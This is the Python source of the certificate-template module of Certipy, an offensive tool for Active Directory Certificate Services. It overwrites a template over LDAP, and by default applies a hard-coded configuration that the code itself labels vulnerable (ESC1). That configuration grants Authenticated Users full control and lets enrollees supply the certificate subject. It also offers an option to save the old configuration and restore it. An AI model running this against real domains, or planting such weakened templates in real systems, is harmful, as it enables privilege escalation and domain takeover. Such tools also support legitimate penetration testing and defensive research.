import argparse
import json
import logging
from typing import Callable, Dict, Tuple

import ldap3
from ldap3.protocol.microsoft import security_descriptor_control

from certipy import target
from certipy.ldap import LDAPConnection, LDAPEntry
from certipy.target import Target

NAME = "template"

PROTECTED_ATTRIBUTES = [
    "objectClass",
    "cn",
    "distinguishedName",
    "whenCreated",
    "whenChanged",
    "name",
    "objectGUID",
    "objectCategory",
    "dSCorePropagationData",
    "msPKI-Cert-Template-OID",
    "uSNCreated",
    "uSNChanged",
    "displayName",
    "instanceType",
    "revision",
    "msPKI-Template-Schema-Version",
    "msPKI-Template-Minor-Revision",
]

# SubCA template configuration with full control for 'Authenticated Users'
CONFIGURATION_TEMPLATE = {
    "showInAdvancedViewOnly": [b"TRUE"],
    "nTSecurityDescriptor": [
        b"\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00\xc8\xa3\x1f\xdd\xe9\xba\xb8\x90,\xaes\xbb\xf4\x01\x00\x00"  # Authenticated Users - Full Control
    ],
    "flags": [b"131793"],
    "pKIDefaultKeySpec": [b"2"],
    "pKIKeyUsage": [b"\x86\x00"],
    "pKIMaxIssuingDepth": [b"-1"],
    "pKICriticalExtensions": [b"2.5.29.19", b"2.5.29.15"],
    "pKIExpirationPeriod": [b"\x00@\x1e\xa4\xe8e\xfa\xff"],
    "pKIOverlapPeriod": [b"\x00\x80\xa6\n\xff\xde\xff\xff"],
    "pKIDefaultCSPs": [b"1,Microsoft Enhanced Cryptographic Provider v1.0"],
    "msPKI-RA-Signature": [b"0"],
    "msPKI-Enrollment-Flag": [b"0"],
    "msPKI-Private-Key-Flag": [b"16842768"],
    "msPKI-Certificate-Name-Flag": [b"1"],
    "msPKI-Minimal-Key-Size": [b"2048"],
}


class Template:
    def __init__(
        self,
        target: "Target",
        template: str = None,
        configuration: str = None,
        save_old: bool = False,
        scheme: str = "ldaps",
        connection: LDAPConnection = None,
        **kwargs,
    ):
        self.target = target
        self.template_name = template
        self.configuration = configuration
        self.save_old = save_old
        self.scheme = scheme
        self.kwargs = kwargs

        self._connection = connection

    @property
    def connection(self) -> LDAPConnection:
        if self._connection is not None:
            return self._connection

        self._connection = LDAPConnection(self.target, self.scheme)
        self._connection.connect()

        return self._connection

    def configuration_to_json(self, configuration: dict) -> str:
        output = {}
        for key, value in configuration.items():
            if key in PROTECTED_ATTRIBUTES:
                continue

            if type(value) == list:
                output[key] = list(map(lambda x: x.hex(), value))
            else:
                output[key] = value.hex()

        return json.dumps(output)

    def get_configuration(self, template) -> LDAPEntry:
        results = self.connection.search(
            "(&(cn=%s)(objectClass=pKICertificateTemplate))" % template,
            search_base=self.connection.configuration_path,
            query_sd=True,
        )

        if len(results) == 0:
            results = self.connection.search(
                "(&(displayName=%s)(objectClass=pKICertificateTemplate))" % template,
                search_base=self.connection.configuration_path,
                query_sd=True,
            )

            if len(results) == 0:
                logging.error(
                    "Could not find any certificate template for %s" % repr(template)
                )
                return None

        if len(results) > 1:
            # This should never happen, but just in case
            logging.error(
                "Found multiple certificate templates identified by %s" % repr(template)
            )
            return None

        template = results[0]

        return template

    def json_to_configuration(self, configuration_json: str) -> Dict:
        output = {}
        for key, value in configuration_json.items():
            if key in PROTECTED_ATTRIBUTES:
                continue

            if type(value) == list:
                output[key] = list(map(lambda x: bytes.fromhex(x), value))
            else:
                output[key] = bytes.fromhex(value)

        return output

    def load_configuration(self, configuration: str) -> Dict:
        with open(configuration, "r") as f:
            configuration_json = json.load(f)

        return self.json_to_configuration(configuration_json)

    def set_configuration(self) -> bool:
        if self.template_name is None:
            logging.error("A template (-template) is required")
            return False

        if self.configuration is not None:
            new_configuration = self.load_configuration(self.configuration)
        else:
            new_configuration = CONFIGURATION_TEMPLATE

        old_configuration = self.get_configuration(self.template_name)
        if old_configuration is None:
            return False

        if self.save_old:
            old_configuration_json = self.configuration_to_json(
                old_configuration["raw_attributes"]
            )

            out_file = "%s.json" % old_configuration.get("cn")
            with open(out_file, "w") as f:
                f.write(old_configuration_json)

            logging.info(
                "Saved old configuration for %s to %s"
                % (repr(self.template_name), repr(out_file))
            )

        changes = {}
        for key in old_configuration["raw_attributes"].keys():
            if key in PROTECTED_ATTRIBUTES:
                continue

            if key not in new_configuration:
                changes[key] = [
                    (
                        ldap3.MODIFY_DELETE,
                        [],
                    )
                ]
                pass

            if key in new_configuration:
                old_values = old_configuration.get_raw(key)
                new_values = new_configuration[key]
                if all(list(map(lambda x: x in new_values, old_values))):
                    continue

                changes[key] = [
                    (
                        ldap3.MODIFY_REPLACE,
                        new_configuration[key],
                    )
                ]
        for key, value in new_configuration.items():
            if (
                key in changes
                or key in PROTECTED_ATTRIBUTES
                or key in old_configuration["raw_attributes"]
            ):
                continue

            changes[key] = [
                (
                    ldap3.MODIFY_ADD,
                    value,
                )
            ]

        if len(changes.keys()) == 0:
            logging.warning(
                "New configuration is the same as old configuration. Not updating"
            )
            return False

        logging.info(
            "Updating certificate template %s" % repr(old_configuration.get("cn"))
        )

        result = self.connection.modify(
            old_configuration.get("distinguishedName"),
            changes,
            controls=security_descriptor_control(sdflags=0x4),
        )

        if result["result"] == 0:
            logging.info("Successfully updated %s" % repr(old_configuration.get("cn")))
            return True
        elif result["result"] == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS:
            logging.error(
                "User %s doesn't have permission to update these attributes on %s"
                % (repr(self.target.username), repr(old_configuration.get("cn")))
            )
        else:
            logging.error("Got error: %s" % result["message"])


def entry(options: argparse.Namespace) -> None:
    target = Target.from_options(options)
    del options.target

    template = Template(target=target, **vars(options))
    template.set_configuration()


def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:
    subparser = subparsers.add_parser(NAME, help="Manage certificate templates")

    subparser.add_argument(
        "-template", action="store", metavar="template name", required=True
    )
    subparser.add_argument("-debug", action="store_true", help="Turn debug output on")

    group = subparser.add_argument_group("configuration options")
    group.add_argument(
        "-configuration",
        action="store",
        metavar="configuration file",
        help="Configuration to apply to the certificate template. If omitted, a default vulnerable configuration (ESC1) will be applied. Useful for restoring an old configuration",
    )
    group.add_argument(
        "-save-old",
        action="store_true",
        help="Save the old configuration",
    )

    group = subparser.add_argument_group("connection options")
    group.add_argument(
        "-scheme",
        action="store",
        metavar="ldap scheme",
        choices=["ldap", "ldaps"],
        default="ldaps",
    )

    target.add_argument_group(subparser, connection_options=group)

    return NAME, entry
